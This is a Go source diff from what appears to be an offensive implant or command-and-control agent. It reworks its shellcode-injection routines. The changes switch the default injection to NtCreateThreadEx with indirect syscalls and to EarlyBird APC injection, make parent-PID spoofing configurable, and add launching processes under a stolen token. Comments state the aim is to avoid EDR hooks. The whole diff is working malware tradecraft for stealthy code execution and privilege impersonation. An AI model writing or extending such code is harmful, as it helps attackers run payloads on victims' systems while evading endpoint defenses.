@@ -282,10 +282,10 @@ func injectProcess(pid uint32, shellcode []byte, tech string) error {
 	}
 	tech = strings.ToLower(strings.TrimSpace(tech))
 	if tech == "" {
-		// Default technique adapts to the detected EDR posture: when indirect
-		// syscalls are active, prefer a quieter path instead of the loud,
-		// hook-happy CreateRemoteThread.
-		tech = "createremotethread"
+		// Default to a quieter path than the loud, hook-happy
+		// CreateRemoteThread. NtCreateThreadEx (via indirect syscall when
+		// available) is less frequently instrumented by EDRs.
+		tech = "ntcreatethreadex"
 		if useIndirectSyscall {
 			tech = "ntcreatethreadex_indirect"
 		}
@@ -362,7 +362,7 @@ func spawnProcess(targetExe string, shellcode []byte, technique string) string {
 	var pi processInformation
 
 	if ppidSpoofEnabled {
-		parentPID := findPidByName("explorer.exe")
+		parentPID := findPidByName(ppidSpoofParent)
 		if parentPID != 0 {
 			var err error
 			hProc, hThread, dwPID, err = createProcessWithPPIDSpoof(exePath, "", parentPID)
@@ -372,7 +372,17 @@ func spawnProcess(targetExe string, shellcode []byte, technique string) string {
 				}
 			}
 		} else if Debug {
-			fmt.Println("[!] explorer.exe not found, skipping PPID spoof")
+			fmt.Printf("[!] %s not found, skipping PPID spoof\n", ppidSpoofParent)
+		}
+	}
+
+	// If a stolen/made token is active, spawn the child under that token so the
+	// impersonated identity propagates to the new process (not just this thread).
+	if hProc == 0 && activeTokenHandle != 0 {
+		if hp, ht, p, err := spawnUnderToken(exePath, "", true); err == nil {
+			hProc, hThread, dwPID = hp, ht, p
+		} else if Debug {
+			fmt.Printf("[!] spawn under token failed (%v), falling back\n", err)
 		}
 	}
 
@@ -409,17 +419,8 @@ func spawnProcess(targetExe string, shellcode []byte, technique string) string {
 	}
 
 	tech := strings.ToLower(strings.TrimSpace(technique))
-	if tech == "" || tech == "createremotethread" || tech == "crt" || tech == "remote" {
-		thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
-		if thread == 0 {
-			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
-			procTerminateProcess.Call(hProc, 1)
-			procCloseHandle.Call(hProc)
-			procCloseHandle.Call(hThread)
-			return "CreateRemoteThread failed"
-		}
-		procCloseHandle.Call(thread)
-	} else if tech == "queueuserapc" || tech == "apc" {
+	switch {
+	case tech == "queueuserapc" || tech == "apc":
 		ret3, _, _ := procQueueUserAPC.Call(addr, hThread, 0)
 		if ret3 == 0 {
 			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
@@ -428,7 +429,7 @@ func spawnProcess(targetExe string, shellcode []byte, technique string) string {
 			procCloseHandle.Call(hThread)
 			return "QueueUserAPC failed"
 		}
-	} else {
+	case tech == "createremotethread" || tech == "crt" || tech == "remote":
 		thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
 		if thread == 0 {
 			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
@@ -438,6 +439,29 @@ func spawnProcess(targetExe string, shellcode []byte, technique string) string {
 			return "CreateRemoteThread failed"
 		}
 		procCloseHandle.Call(thread)
+	default:
+		// Default: EarlyBird APC into the suspended thread is stealthier than
+		// CreateRemoteThread. Fall back to CRT when no thread handle exists.
+		if hThread != 0 {
+			ret3, _, _ := procQueueUserAPC.Call(addr, hThread, 0)
+			if ret3 == 0 {
+				procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
+				procTerminateProcess.Call(hProc, 1)
+				procCloseHandle.Call(hProc)
+				procCloseHandle.Call(hThread)
+				return "QueueUserAPC failed"
+			}
+		} else {
+			thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
+			if thread == 0 {
+				procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
+				procTerminateProcess.Call(hProc, 1)
+				procCloseHandle.Call(hProc)
+				procCloseHandle.Call(hThread)
+				return "CreateRemoteThread failed"
+			}
+			procCloseHandle.Call(thread)
+		}
 	}
 
 	procResumeThread.Call(hThread)
